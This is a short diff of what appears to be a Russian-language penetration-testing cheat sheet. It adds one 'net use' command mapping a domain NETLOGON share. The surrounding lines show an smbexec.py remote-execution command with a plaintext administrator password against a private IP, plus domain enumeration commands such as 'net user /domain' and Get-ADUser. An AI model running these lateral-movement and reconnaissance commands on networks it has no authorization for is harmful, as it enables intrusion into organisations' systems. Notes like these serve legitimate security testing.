@@ -95,6 +95,7 @@ python smbexec.py ignite/administrator:Ignite@987@192.168.1.105
 ***************************************************************************************************************************************************
 Cбор информации в домене 
 
+net use * \\ta-d.local\NETLOGON - подключить сетевой диск
 
 net user /domain пользователи домена
 Get-ADUser -identity administrator -properties *
